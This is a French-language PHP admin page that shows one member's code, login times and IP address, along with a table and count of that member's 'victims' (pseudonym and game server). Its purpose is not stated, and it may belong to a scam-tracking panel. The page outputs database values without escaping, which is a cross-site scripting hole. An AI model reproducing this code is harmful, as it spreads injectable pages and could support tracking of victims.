<?php
session_start();

require("../includes/vars.php");

if(isset($_SESSION['id']) AND $_SESSION['id'] == '1') {

	if(isset($_GET['id']) AND !empty($_GET['id'])) {

		$connected = $bdd->query('SELECT * FROM membres_kolizeum WHERE connected="oui" ORDER BY pseudo');
		$disconnected = $bdd->query('SELECT * FROM membres_kolizeum WHERE connected="non" ORDER BY pseudo');

        $get_id = htmlspecialchars($_GET['id']);

        $victimes = $bdd->prepare('SELECT * FROM victimes_membres WHERE id_membre = ? ORDER BY id');
  		$victimes->execute(array($get_id));

        $membre = $bdd->prepare("SELECT * FROM membres_kolizeum WHERE id = ?");
        $membre->execute(array($get_id));

		if($membre->rowCount() == 1) {
			$userinfo = $membre->fetch();
			$code = $userinfo['code'];
		}
		else {
			header('Location: panel.php');
		}

    }
    else {
        header("Location: panel.php");
    }

}
else {
	header("Location: index.php");
}
?>

<!DOCTYPE html>
<html lang="fr">
<head>
	<meta charset="UTF-8">
	<title>Espace membre</title>
	<link rel="stylesheet" type="text/css" href="css/style.css">
</head>
<body>
	<?php include("include_notif.php"); ?>

	<?php include("../includes/sidenav.php"); ?>


	<h1>Code de <?php echo $userinfo['pseudo']; ?> :</h1>
	<h2 id="code_area" style="margin-top: -40px; margin: 0 auto; background: #a15412; padding: 5px; width: 130px; height: 40px; padding-top: 15px;"><?= utf8_encode($code); ?></h2>

	<button class="copy_btn" onclick="CopyToClipboard('code_area')">Copier</button>

	<a href="panel.php" title="Retour"><img src="img/back.png" class="back" /></a>
	<a href="deconnexion.php" title="Déconnexion"><img src="img/logout.png" class="logout" /></a>

	<h2>Dernière connexion : <?php echo strftime("Le %d/%m/%Y à %H:%M", strtotime($userinfo['derniere_connexion'])); ?></h2>
	<h2>Dernière déconnexion : <?php echo strftime("Le %d/%m/%Y à %H:%M", strtotime($userinfo['derniere_deconnexion'])); ?></h2>
	<h2>Adresse IP : </h2> <?php echo $userinfo['adresse_ip']; ?>
	
	<h1 style="margin-top: 70px;">Liste des victimes</h1>

    <?php
      echo'
          <table>
              <thead>
                  <tr>
                      <th>Pseudo</th>
                      <th>Serveur</th>
                      <th>Modifier</th>
                      <th>Supprimer</th>
                  </tr>
              </thead>
              <tbody>';
       
      while($v = $victimes->fetch())
      { 
      echo "<tr>
      <td>".$v['pseudo_victime']."</td>
      <td>".$v['serveur_victime']."</td>
      <td><a href='edit_victime.php?id=".$v['id']."&id_membre=".$get_id."'><img src='img/edit.png'></a></td>
      <td><a href='delete_victime_admin.php?id=".$v['id']."&id_membre=".$get_id."'><img src='img/delete.png'></a></td>
      </tr>";
      }
      echo "</tbody></table>";
    ?>
    <br />
    <?php
      $total = 0;
      $sqls = $bdd->prepare('SELECT COUNT(*) AS id FROM victimes_membres WHERE id_membre = ?');
      $sqls->execute(array($get_id));

      if ($sqls) {
        $total = $sqls->fetchColumn();
      }
      
      echo "<h4><strong>TOTAL DE VICTIMES : ".$total."</strong></h4>";
    ?>


	


	<script type="text/javascript">
		function CopyToClipboard(containerid) {
			if (document.selection) { 
			    var range = document.body.createTextRange();
			    range.moveToElementText(document.getElementById(containerid));
			    range.select().createTextRange();
			    document.execCommand("copy"); 

			}
			else if (window.getSelection) {
				var range = document.createRange();
				range.selectNode(document.getElementById(containerid));
				window.getSelection().addRange(range);
				document.execCommand("copy");
				var audio = new Audio('sound.mp3');
				audio.play();
			}
		}
	</script>	
</body>
</html>